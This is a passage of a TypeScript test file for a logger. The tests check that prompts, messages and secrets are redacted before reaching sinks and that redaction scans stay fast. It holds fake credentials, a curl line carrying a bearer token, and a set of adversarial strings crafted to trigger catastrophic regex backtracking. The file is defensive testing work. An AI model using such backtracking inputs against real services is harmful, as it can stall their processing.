    const event = await logOnce({ input: { path: '/etc/hosts' }, text: 'model reply', prompt: 'summarise this', messages: [{ role: 'user', content: 'hi' }], userInput: 'typed', systemPrompt: 'be brief', chatMessages: [], statusText: 'Not Found', prompts: ['a'], inputTokens: 12, message: 'kept' })
    expect(event.fields).toEqual({ input: '[omitted object]', text: '[omitted 11 bytes]', prompt: '[omitted 14 bytes]', messages: '[omitted object]', userInput: '[omitted 5 bytes]', systemPrompt: '[omitted 8 bytes]', chatMessages: '[omitted object]', statusText: '[omitted 9 bytes]', prompts: '[omitted object]', inputTokens: 12, message: 'kept' })
  })

  it('never lets a bearer token or other text inside a dropped content key reach a sink', async () => {
    const bearer = 'Bearer q7Zr2mXv9LpK3tHs'
    const sink = memorySink()
    const root = createLogger({ component: 'test', sinks: [sink] })
    root.logger.info('model call', { request: { prompt: `use ${bearer} to call the API`, messages: [{ role: 'user', content: `my password is hunter2, header ${bearer}` }] }, input: `curl -H 'Authorization: ${bearer}'`, text: 'reply mentions hunter2' })
    await root.flush()
    const serialized = JSON.stringify(sink.events)
    for (const leaked of ['q7Zr2mXv9LpK3tHs', 'hunter2', 'Bearer', 'curl']) expect(serialized).not.toContain(leaked)
  })

  it('keeps tokensUsed a number when numeric and redacts it otherwise', async () => {
    const event = await logOnce({ tokensUsed: 1_234, tokens_used: '56', usedTokens: 7 })
    expect(event.fields).toEqual({ tokensUsed: 1_234, tokens_used: '56', usedTokens: 7 })
    const opaque = await logOnce({ tokensUsed: 'tok_live_abc' })
    expect(opaque.fields).toEqual({ tokensUsed: '[redacted]' })
  })

  it('accepts omitKeys and allowKeys from a runtime config object and refuses malformed values', async () => {
    const config: LoggerConfig = JSON.parse('{"level":"debug","omitKeys":["diff"],"allowKeys":["statusText"]}')
    const sink = memorySink()
    const root = createLogger({ component: 'test', sinks: [sink], ...config })
    root.logger.debug('patched', { diff: '+ secret line', statusText: 'Not Found' })
    await root.flush()
    expect(sink.events[0]!.fields).toEqual({ diff: '[omitted 13 bytes]', statusText: 'Not Found' })
    const malformed: unknown[] = [{ omitKeys: 'diff' }, { omitKeys: ['diff', 1] }, { allowKeys: 'body' }, { level: 'verbose' }, { queueLimit: 0 }, { maxStringBytes: Number.NaN }, { maxEventBytes: -1 }, { maxObjectKeys: 1.5 }]
    for (const value of malformed) expect(() => createLogger({ component: 'test', sinks: [], ...(value as LoggerConfig) })).toThrow(TypeError)
  })
})

describe('bounded redaction scans (URL pattern super-linear)', () => {
  const LENGTH = 100_000
  const fill = (unit: string, tail = '') => unit.repeat(Math.ceil(LENGTH / unit.length)).slice(0, LENGTH - tail.length) + tail
  // Each shape made one pattern backtrack over the rest of the input from every start position.
  const adversarial: Record<string, string> = {
    'letters and hyphens (URL scheme)': fill('a-', 'Q'),
    'scheme characters without ://': fill('ab+', '!'),
    'dotted words (URL scheme)': fill('eyJa.'),
    'eyJ runs without dots (JWT)': fill('eyJ-'),
    'userinfo with spaces and no @': `https://${fill('word ')}`,
    'userinfo with quotes and no @': `https://${fill("word'")}`,
    'trailing punctuation in a URL parameter': `https://x.example/?token=${fill(').', 'x')}`,
  }

  function elapsedMs(work: () => unknown): number {
    const start = performance.now()
    work()
    return performance.now() - start
  }

  it('redactText scans at most 8 KB and marks the rest as truncated', () => {
    const redacted = redactText(`${'x'.repeat(8_000)} Bearer abcdefghijklmnop ${'y'.repeat(LENGTH)}`)
    expect(redacted).not.toContain('abcdefghijklmnop')
    expect(redacted).toMatch(/\.\.\.\[truncated \d+ bytes\]$/)
    expect(Buffer.byteLength(redacted)).toBeLessThan(8_300)
  })

  it.each(Object.entries(adversarial))('redactText finishes a 100k-character %s string under 100 ms', (_, text) => {
    expect(elapsedMs(() => redactText(text))).toBeLessThan(100)
  })

  it.each(Object.entries(adversarial))('a logger allowed 200 KB strings builds a 100k-character %s event under 100 ms', async (_, text) => {
    const sink = memorySink()
    const root = createLogger({ component: 'test', sinks: [sink], maxStringBytes: 200_000, maxEventBytes: 400_000 })
    expect(elapsedMs(() => root.logger.info('adversarial', { note: text }))).toBeLessThan(100)
    await root.flush()
    expect(sink.events).toHaveLength(1)
  })
})
